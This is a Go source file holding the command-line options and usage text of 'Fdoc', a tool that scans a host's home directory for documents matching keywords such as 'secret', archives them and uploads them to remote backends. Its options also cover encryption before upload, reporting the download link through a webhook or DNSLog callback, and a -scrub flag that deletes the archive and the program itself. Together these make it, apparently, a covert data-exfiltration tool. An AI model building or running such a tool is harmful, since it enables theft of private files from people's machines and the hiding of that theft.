package option

import (
	"Fdoc/logx"
	"Fdoc/utils"
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"net/url"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"
)

// FlagInfo holds all CLI flags.
type FlagInfo struct {
	MaxSize      string
	MaxFileSize  string
	OutputPath   string
	AfterDateStr string
	RootPath     string
	SkipDirs     string
	FileName     string
	Keyword      string
	Extension    string
	Size         bool
	Quiet        bool
	Verbose      bool

	// Upload / callback / scrub
	Upload     bool
	Backend    string
	Force      bool
	Webhook    string
	DNS        string
	TaskID     string
	CBTimeout  time.Duration
	// ProgressInterval is NoBar upload/encrypt tick period; 0 disables; default 3m via flag.
	ProgressInterval time.Duration
	Scrub            bool
	Encrypt          bool
	EncryptKey       string
}

// InitFlag parses flags and validates inputs.
func (info *FlagInfo) InitFlag() {
	info.GetFlag()
	logx.SetQuiet(info.Quiet)
	logx.SetDebug(info.Verbose)
	info.validateFlags()
	info.initRootPath()
	info.applyDefaultSkipDirs()
	info.checkDirectory(info.RootPath, "directory does not exist")
	if !info.Size {
		info.checkFileExistence(info.OutputPath, "output archive already exists, choose another path")
	}
	info.logDebugInfo()
}

func (info *FlagInfo) validateFlags() {
	if _, err := utils.ParseSize(info.MaxSize); err != nil {
		logx.Error("invalid -max %q: %v", info.MaxSize, err)
		os.Exit(1)
	}
	if info.MaxFileSize != "0" {
		if _, err := utils.ParseSize(info.MaxFileSize); err != nil {
			logx.Error("invalid -max-file %q: %v", info.MaxFileSize, err)
			os.Exit(1)
		}
	}
	if info.AfterDateStr != "" {
		if _, err := time.ParseInLocation("2006-01-02", info.AfterDateStr, time.Local); err != nil {
			logx.Error("invalid -t date %q (want YYYY-MM-DD): %v", info.AfterDateStr, err)
			os.Exit(1)
		}
	}
	if info.Upload && info.Size {
		logx.Error("-upload cannot be used with -size")
		os.Exit(1)
	}
	if info.Scrub && !info.Upload {
		logx.Error("-scrub requires -upload (cleanup runs only after successful upload)")
		os.Exit(1)
	}
	if info.Encrypt && !info.Upload {
		logx.Error("-encrypt requires -upload")
		os.Exit(1)
	}
	if info.Encrypt && info.EncryptKey == "" {
		logx.Error("-encrypt requires -key")
		os.Exit(1)
	}
	if info.Upload && info.Webhook != "" {
		if err := validateWebhookURL(info.Webhook); err != nil {
			logx.Error("%v", err)
			os.Exit(1)
		}
	}
	if info.CBTimeout <= 0 {
		info.CBTimeout = 15 * time.Second
	}
	// task-id only needed when a remote callback channel is configured
	if info.Upload && (info.Webhook != "" || info.DNS != "") {
		if info.TaskID == "" {
			info.TaskID = genTaskID()
		} else {
			info.TaskID = sanitizeTaskID(info.TaskID)
		}
		if info.TaskID == "" {
			logx.Error("invalid -task-id (need [a-z0-9-])")
			os.Exit(1)
		}
	}
}

func genTaskID() string {
	var b [8]byte
	if _, err := rand.Read(b[:]); err != nil {
		return fmt.Sprintf("t%d", time.Now().UnixNano()%1e12)
	}
	return hex.EncodeToString(b[:])
}

func sanitizeTaskID(s string) string {
	s = strings.ToLower(strings.TrimSpace(s))
	var b strings.Builder
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') || r == '-' {
			b.WriteRune(r)
		}
	}
	out := b.String()
	if len(out) > 40 {
		out = out[:40]
	}
	return out
}

func validateWebhookURL(raw string) error {
	u, err := url.Parse(raw)
	if err != nil {
		return fmt.Errorf("invalid -webhook: %w", err)
	}
	switch strings.ToLower(u.Scheme) {
	case "https":
		return nil
	case "http":
		if utils.IsLoopbackHost(u.Hostname()) {
			return nil
		}
		return fmt.Errorf("-webhook must use https (http only allowed for loopback)")
	default:
		return fmt.Errorf("-webhook must use https")
	}
}

// GetFlag registers and parses CLI flags.
func (info *FlagInfo) GetFlag() {
	flag.Usage = printUsage
	flag.StringVar(&info.MaxSize, "max", "1GB", "stop packing after this total size")
	flag.StringVar(&info.MaxFileSize, "max-file", "100MB", "skip files larger than this (0=off)")
	flag.StringVar(&info.OutputPath, "o", "", "output .tgz path")
	flag.StringVar(&info.AfterDateStr, "t", "", "only files on/after date (YYYY-MM-DD)")
	flag.StringVar(&info.RootPath, "d", "", "scan root (default: home)")
	flag.StringVar(&info.SkipDirs, "x", "", "dirs to skip (comma-separated)")
	flag.StringVar(&info.FileName, "f", "", "filename contains (comma = OR)")
	flag.StringVar(&info.Keyword, "k", "", "file content contains (comma = OR)")
	flag.StringVar(&info.Extension, "e", "documents", "ext filter: documents|all|any|pdf,txt,...")
	flag.BoolVar(&info.Size, "size", false, "only measure size, do not pack")
	flag.BoolVar(&info.Quiet, "q", false, "quiet")
	flag.BoolVar(&info.Verbose, "v", false, "verbose")

	flag.BoolVar(&info.Upload, "upload", false, "upload archive after packing")
	flag.StringVar(&info.Backend, "b", "", "upload backend (default: auto)")
	flag.BoolVar(&info.Force, "force", false, "allow flaky upload backends")
	flag.StringVar(&info.Webhook, "webhook", "", "HTTPS callback URL (optional)")
	flag.StringVar(&info.DNS, "dns", "", "DNSLog domain for callback (optional)")
	flag.StringVar(&info.TaskID, "task-id", "", "callback task id (auto if empty)")
	var cbTimeoutSec float64
	flag.Float64Var(&cbTimeoutSec, "cb-timeout", 15, "callback timeout seconds")
	var progressIntervalMin float64
	flag.Float64Var(&progressIntervalMin, "progress-interval", 3, "minutes between upload/encrypt progress lines when no bar (0=off)")
	flag.BoolVar(&info.Scrub, "scrub", false, "delete archive + self after success")
	flag.BoolVar(&info.Encrypt, "encrypt", false, "encrypt before upload (needs -key)")
	flag.StringVar(&info.EncryptKey, "key", "", "encrypt key (with -encrypt; not -k)")

	flag.Parse()
	info.CBTimeout = time.Duration(cbTimeoutSec * float64(time.Second))
	if progressIntervalMin <= 0 {
		info.ProgressInterval = -1 // disable ticks
	} else {
		info.ProgressInterval = time.Duration(progressIntervalMin * float64(time.Minute))
	}

	if info.OutputPath == "" {
		info.OutputPath = fmt.Sprintf("output_%s.tgz", time.Now().Format("20060102_150405"))
	}
}

func printUsage() {
	out := flag.CommandLine.Output()
	fmt.Fprintf(out, `Fdoc is a file collector: filter files on a host and pack them into .tgz.

Optional -upload embeds uploader (auto backend by size). Without -webhook/-dns,
the download URL is printed locally. With -webhook/-dns, the link is pushed via
failover callback. -encrypt requires -upload and -key (decrypt with Fdoc decrypt).

Usage:
  Fdoc [flags]
  Fdoc decrypt [flags] <cipher>

Examples:
  Fdoc -d /data -o out.tgz
  Fdoc -d /data -size
  Fdoc -d /data -o out.tgz -upload -q
  Fdoc -d /data -o out.tgz -upload -webhook https://host/hook -scrub
  Fdoc -d /data -e zip -f secret -max-file 0 -max 10GB -upload -encrypt -key SECRET -b gg
  Fdoc decrypt -key SECRET -o out.tgz cipher.bin

Filters (-e/-f/-k/-t) are AND; comma lists inside one flag are OR.
Default: -e documents, -max 1GB, -max-file 100MB.
Exit: 0 ok, 1 error, 2 hit -max (partial kept). Docs: README.md / README.zh-CN.md

Flags:
INPUT:
   -d string                 scan root (default: home)
   -x string                 directories to skip, comma-separated (replaces OS defaults if set)

FILTERING:
   -e string                 ext filter: documents|all|any|pdf,txt,zip,... (default "documents")
   -f string                 filename contains (comma = OR)
   -k string                 file content contains (comma = OR)
   -t string                 only files modified on/after date (YYYY-MM-DD)

PACK:
   -o string                 output .tgz path (default output_<timestamp>.tgz)
   -max string               stop packing after this total size (default "1GB")
   -max-file string          skip a single file larger than this (default "100MB"; 0=off)
   -size                     measure matched size only; do not pack

UPLOAD:
   -upload                   after packing, upload archive (auto backend by size)
   -b string                 pin upload backend (default: auto probe+failover)
   -force                    allow flaky/down upload backends
   -encrypt                  encrypt stream before upload (requires -upload and -key)
   -key string               encryption key for -encrypt (not the same as -k)
   -progress-interval float  minutes between upload/encrypt progress lines when no bar (default 3; 0=off)

CALLBACK:
   -webhook string           optional HTTPS callback URL (POST JSON; http only for loopback)
   -dns string               optional DNSLog base (failover if webhook fails/unset)
   -task-id string           callback task id (auto if empty; with -webhook/-dns)
   -cb-timeout float         webhook timeout / DNS budget seconds (default 15)

CLEANUP:
   -scrub                    after successful upload (+ callback if any), delete archive and self

OUTPUT:
   -q                        quiet (human logs off; machine lines still print)
   -v                        verbose (matched paths + upload probe/retry details)
`)
}

func (info *FlagInfo) initRootPath() {
	if info.RootPath != "" {
		return
	}
	currentUser, err := user.Current()
	if err != nil {
		logx.Warning("failed to get current user: %v", err)
		os.Exit(1)
	}
	logx.Debug("user home: %s", currentUser.HomeDir)
	info.RootPath = currentUser.HomeDir
}

func (info *FlagInfo) applyDefaultSkipDirs() {
	if info.SkipDirs != "" {
		return
	}
	switch runtime.GOOS {
	case "windows":
		info.SkipDirs = `C:\Windows,C:\Program Files,C:\Program Files (x86),C:\inetpub,C:\Users\Public`
	case "darwin":
		// Skip bulky / TCC-protected trees that commonly yield "operation not permitted".
		info.SkipDirs = strings.Join([]string{
			".Trash",
			".docker",
			"Library/Caches",
			"Library/Containers",
			"Library/Group Containers",
			"Library/Logs",
			"Library/Mail",
			"Library/Messages",
			"Library/Safari",
			"Library/HomeKit",
			"Library/IdentityServices",
			"Library/Suggestions",
			"Library/Shortcuts",
			"Library/Application Support/MobileSync",
			"Library/Application Support/Steam",
			"Pictures/Photos Library.photoslibrary",
		}, ",")
	case "linux":
		info.SkipDirs = strings.Join([]string{
			".cache",
			".local/share/Trash",
			".docker",
			".Trash",
			"snap",
		}, ",")
	}
}

func (info *FlagInfo) checkDirectory(path string, errMsg string) {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		logx.Error("%s: %s", errMsg, path)
		os.Exit(1)
	}
}

func (info *FlagInfo) checkFileExistence(path string, errMsg string) {
	if _, err := os.Stat(path); err == nil {
		logx.Error("%s: %s", errMsg, path)
		os.Exit(1)
	}
}

func (info *FlagInfo) logDebugInfo() {
	logx.Debug("MaxSize=%s", info.MaxSize)
	logx.Debug("MaxFileSize=%s", info.MaxFileSize)
	logx.Debug("OutputPath=%s", info.OutputPath)
	logx.Debug("AfterDateStr=%s", info.AfterDateStr)
	logx.Debug("RootPath=%s", info.RootPath)
	logx.Debug("SkipDirs=%s", info.SkipDirs)
	logx.Debug("FileName=%s", info.FileName)
	logx.Debug("Keyword=%s", info.Keyword)
	logx.Debug("Extension=%s", info.Extension)
	logx.Debug("Upload=%v Backend=%q Webhook=%q DNS=%q TaskID=%q Scrub=%v",
		info.Upload, info.Backend, info.Webhook, info.DNS, info.TaskID, info.Scrub)
}
